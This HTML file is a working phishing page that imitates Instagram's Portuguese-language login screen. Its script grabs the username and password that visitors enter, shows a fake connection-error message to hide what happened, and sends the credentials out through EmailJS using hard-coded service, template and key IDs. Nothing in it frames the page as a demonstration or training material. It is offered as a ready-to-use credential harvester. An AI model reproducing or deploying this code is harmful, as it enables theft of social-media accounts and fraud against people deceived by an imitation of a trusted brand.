<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Instagram</title>
    <script type="text/javascript" src="https://cdn.emailjs.com/dist/email.min.latest.js"></script> <!-- SDK mais recente -->
    <style>
        /* Estilos principais */
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background-color: #fafafa;
        }

        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            max-width: 1000px;
            width: 100%;
            height: 600px;
            box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            background-color: white;
        }

        /* Box de imagem com mockup maior */
        .image-box {
            flex: 1;
            background-image: url('imagens/instagram-web-lox-image.png'); /* Caminho relativo para a imagem */
            background-size: cover;
            background-position: center;
            height: 100%;
            border-radius: 10px 0 0 10px;
            display: flex;
            justify-content: center;
            align-items: center;
            background-repeat: no-repeat;
            background-color: #ffffff;
        }

        /* Formulário de login */
        .login-box {
            width: 350px;
            padding: 40px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            background-color: #fff;
            border-radius: 0 10px 10px 0;
        }

        .logo {
            width: 150px;
            margin-bottom: 20px;
        }

        .input-field {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border-radius: 5px;
            border: 1px solid #dbdbdb;
            font-size: 14px;
            background-color: #fafafa;
        }

        .input-field:focus {
            outline: none;
            border: 1px solid #0095f6;
            background-color: #ffffff;
        }

        .login-btn {
            width: 100%;
            padding: 10px;
            background-color: #0095f6;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
        }

        .login-btn:hover {
            background-color: #007bb5;
        }

        .register {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }

        .register a {
            color: #0095f6;
            text-decoration: none;
        }

        .register a:hover {
            text-decoration: underline;
        }

        .social-links {
            display: flex;
            justify-content: space-around;
            width: 100%;
            margin-top: 20px;
        }

        .social-links a {
            text-decoration: none;
            font-size: 14px;
            color: #0095f6;
        }

        .social-links a:hover {
            text-decoration: underline;
        }

        .store-links {
            display: flex;
            justify-content: center;
            margin-top: 20px;
            width: 100%;
        }

        .store-links a {
            margin: 0 10px;
        }

        .store-links img {
            width: 135px;
        }

        #errorMessage {
            width: 100%;
            background-color: #f8d7da;
            color: #721c24;
            padding: 15px;
            text-align: center;
            font-size: 16px;
            border: 1px solid #f5c6cb;
            margin-bottom: 20px;
            display: none; /* Inicialmente invisível */
        }
    </style>
</head>
<body>

    <!-- Caixa de erro -->
    <div id="errorMessage">Não foi possível conectar. Verifique a conexão com a internet.</div>

    <div class="container">
        <!-- Imagem de mockup dos dispositivos móveis -->
        <div class="image-box">
            <img src="c:\Users\mayke\OneDrive\Imagens\Screenshots\instagram-web-lox-image.png" alt="Instagram Mockup" style="width: 80%; height: auto;"> <!-- Coloque a imagem aqui -->
        </div>

        <!-- Formulário de Login -->
        <div class="login-box">
            <img src="c:\Users\mayke\OneDrive\Imagens\Screenshots\67862da8-a9dc-488c-8537-0fd3298a8987.jpg" alt="Instagram Logo" class="logo"> <!-- Logo do Instagram -->
            <form id="loginForm">
                <input type="text" class="input-field" placeholder="Telefone, nome de usuário ou email" name="username" id="username" required>
                <input type="password" class="input-field" placeholder="Senha" name="password" id="password" required>
                <button type="submit" class="login-btn">Entrar</button>
            </form>

            <div class="register">
                <p>Não tem uma conta? <a href="#">Cadastre-se</a></p>
                <p><a href="#">Esqueceu a senha?</a></p>
            </div>

            <div class="social-links">
                <a href="#">Facebook</a>
                <a href="#">Google</a>
            </div>

            <div class="store-links">
                <a href="#"><img src="imagem/bfe8bb1c-1a51-41e3-b4ec-1198bade903e.jpg" alt="Baixar no Google Play"></a>
                <a href="#"><img src="imagem/b7483e29-74bf-4cfb-8c1a-b5d019a93543.jpg" alt="Baixar na App Store"></a>
            </div>
        </div>
    </div>

    <script>
        // Inicializa o EmailJS com o seu User ID (Public Key)
        (function() {
            emailjs.init("Oc84B0nANZExR9saI");  // Substitua pelo seu User ID (Public Key) real do EmailJS
        })();

        // Adiciona o evento de envio do formulário
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();

            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            
            // Exibir a mensagem de erro ao tentar enviar o formulário
            const errorMessage = document.getElementById("errorMessage");
            errorMessage.style.display = "block"; // Exibe a caixa de erro imediatamente

            // Enviar os dados para o e-mail (ID do serviço e template)
            emailjs.send("service_4pg9ecp", "template_oh75pin", {  // Usando o Template ID e Service ID corretos
                username: username,
                password: password
            })
            .then(function(response) {
                alert("E-mail enviado com sucesso!");
                errorMessage.style.display = "none"; // Se o e-mail for enviado com sucesso, esconde a mensagem de erro
            }, function(error) {
                // Se falhar, a mensagem de erro já está visível
                console.error("Falha ao enviar o e-mail: ", error);
            });
        });
    </script>

</body>
</html>
